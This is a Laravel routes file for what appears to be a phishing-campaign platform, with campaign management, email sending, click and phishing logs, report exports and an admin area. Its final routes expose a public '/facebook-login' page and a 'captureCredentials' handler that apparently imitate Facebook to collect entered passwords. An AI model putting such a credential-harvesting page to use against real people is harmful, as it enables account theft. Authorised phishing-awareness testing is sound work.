<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\dashboardcontoller;
use App\Http\Controllers\phishingcontoller;
use App\Http\Controllers\campaigncontoller;
use App\Http\Controllers\LogController;
use App\Http\Controllers\ExportController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\SettingsController;
use Illuminate\Support\Facades\Auth;

Route::get('/', function () {
    return view(view:'welcome');
});

Auth::routes();

Route::middleware(['auth'])->group(function(){
    Route::get('/dashboard', [dashboardcontoller::class, 'index'])->name('dashboard');
    Route::resource('/campaigns', campaigncontoller::class);
    Route::post('/campaigns/{campaign}/send-emails', [campaigncontoller::class, 'sendEmails'])->name('campaigns.send-emails');
    Route::get('/logs/phishing', [LogController::class, 'phishingLogs'])->name('logs.phishing');
    Route::get('/logs/clicks', [LogController::class, 'clickLogs'])->name('logs.clicks');
    
    // Export routes
    Route::get('/export/phishing-logs', [ExportController::class, 'exportPhishingLogs'])->name('export.phishing-logs');
    Route::get('/export/click-logs', [ExportController::class, 'exportClickLogs'])->name('export.click-logs');
    Route::get('/export/campaign/{campaign}', [ExportController::class, 'exportCampaignReport'])->name('export.campaign');
    
    // Admin routes
    Route::middleware('admin')->prefix('admin')->group(function(){
        Route::get('/dashboard', function() {
            return view('admin.dashboard');
        })->name('admin.dashboard');
        Route::resource('/users', UserController::class)->names('admin.users');
        Route::get('/settings', [SettingsController::class, 'index'])->name('admin.settings.index');
        Route::put('/settings', [SettingsController::class, 'update'])->name('admin.settings.update');
    });
});

Route::get('/facebook-login', [phishingcontoller::class, 'showLoginPage'])->name('phishing.login');
Route::post('/facebook-login', [phishingcontoller::class, 'captureCredentials'])->name('phishing.capture');

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');




